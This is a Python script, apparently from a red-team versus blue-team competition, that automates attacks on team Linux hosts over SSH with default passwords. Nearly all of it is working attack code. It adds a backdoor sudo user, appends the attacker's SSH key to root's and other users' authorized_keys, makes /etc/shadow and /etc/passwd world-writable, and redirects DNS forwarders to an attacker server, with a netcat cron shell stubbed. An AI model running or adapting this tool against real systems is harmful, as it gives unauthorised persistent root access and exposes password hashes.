################################################################################
# Author: Trenton Taylor                                                       #
# Started: 9/27/2018                                                           #
# Purpose: Automated Red Team Attack Tool                                      #
################################################################################

from pexpect import pxssh
import datetime
from os.path import expanduser


class Host:
    def __init__(self, team_number, last_octet=0, base_ip=[172, 25, 20, 0], username="root", password="changeme"):
        self.ip = "%d.%d.%d.%d" % (base_ip[0], base_ip[1], base_ip[2] + team_number, last_octet)
        self.last_octet = last_octet
        self.username = username
        self.password = password
        self.team = team_number

class Team:
    def __init__(self, team_number):
        self.number = team_number
        self.ubuntu = Host(team_number, last_octet=23)
        self.centos = Host(team_number, last_octet=11)
        self.pfsense = Host(team_number, last_octet=2, username="admin", password="changeme")

def main():
    last_octet = {}
    last_octet['ubuntu'] = 23
    last_octet['centos'] = 11
    last_octet['pfsense'] = 2

    teams_numbers = range(1,3)
    teams = []

    for i in teams_numbers:
        teams.append(Team(i))
        print(i)

    for team in teams:
        print(team.number)

        print(team.ubuntu.ip)
        universal_linux_attack(team.ubuntu)
        print(team.centos.ip)
        universal_linux_attack(team.centos)
        print(team.pfsense.ip)

def get_ssh_pub():
    home = expanduser("~")
    filename = "{}/.ssh/id_rsa.pub".format(home)
    rsa_pub = ""
    try:
        with open(filename, "r") as f:
            rsa_pub = f.read()
    except Exception as e:
        print(e)
        exit(1)

    return rsa_pub

def pfsense_attacks(host):
    pass

def universal_linux_attack(host):
    
    
    print("Creating SSH session on {}.".format(host.ip))
    # Create SSH session
    ssh = pxssh.pxssh()
    ssh.login(host.ip, host.username, password=host.password)
    ssh.prompt()
    
    # add user
    username = "tom"
    password = "hunter2"
    user_add_cmd = "useradd -m -d /home/{0}/ -s /bin/bash {0}".format(username)
    print("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip))
    
    ssh.sendline(user_add_cmd)
    ssh.prompt()
    print(ssh.before.decode('utf8'))

    user_passwd_cmd = "| passwd {0}".format(username)
    ssh.sendline(user_passwd_cmd)
    ssh.expect("password: ")
    ssh.sendline(password)
    ssh.expect("password: ")
    ssh.sendline(password)
    ssh.prompt()
    
    print(ssh.before.decode('utf8'))
    
    # add user to sudoers
    print("Adding user {0} to sudoers on {1}.".format(username, host.ip))
    sudo_add_cmd = "usermod -a -G admin {0} || usermod -a -G wheel {0}".format(username)
    
    ssh.sendline(sudo_add_cmd)

    
    # Add SSH keys
    user_directories = {
        "root" : "/root",
        username : "/home/{}".format(username),
        "php" : "/home/php"
    }
    user_group = {
        "root" : "root",
        username : username,
        "php" : "root"
    }
    ssh_pub_key = get_ssh_pub()
    ssh.prompt()
    for user, directory in user_directories.items():
        sshdir_make_cmd = "mkdir -p \'{}/.ssh\'".format(directory)
        sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{2} {1}".format(user, directory, user_group[user])
        
        authorized_keys_file = "{}/.ssh/authorized_keys".format(directory)

        ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)

        print("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip))
        authorized_perms_cmd = "chmod 600 {1} && chown {0}:{0} {1}".format(user, authorized_keys_file)
        
        commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
        for command in commands_to_run:  
            ssh.sendline(command)
            ssh.prompt()
            print(ssh.before.decode('utf8'))

    
    
    # ez mode /etc/shadow
    shadow_perms_cmd = "chmod 777 /etc/shadow"
    ssh.prompt()
    print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
    ssh.sendline(shadow_perms_cmd)
    ssh.prompt()
    print(ssh.before.decode('utf8'))
    
    # ez mode /etc/passwd
    passwd_perms_cmd = "chmod 777 /etc/passwd"
    
    print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
    ssh.sendline(passwd_perms_cmd)
    ssh.prompt()
    print(ssh.before.decode('utf8'))

    # add netcat shell to cron
    netcat_port = "1{}{}".format(host.team, host.last_octet)
    # https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script
    ssh.close()


def ubuntu_attacks(host):
    # Replace upstream DNS with red team villainy
    # sudo update-rc.d bind disable
    ssh = pxssh.pxssh()
    ssh.login(host.ip, host.username, password=host.password)
    red_team_dns = "10.0.0.23"
    change_forwarders_cmd = "sed -i s/131\.239\.30\.1/{}/g".format(red_team_dns)
    reload_bind_cmd = '/etc/init.d/bind9 restart'

    ssh.prompt()
    ssh.sendline(change_forwarders_cmd)
    ssh.prompt()
    ssh.sendline(reload_bind_cmd)
    pass

def centos_attacks(host):
    # sudo update-rc.d httpd disable
    # lol
    pass

main()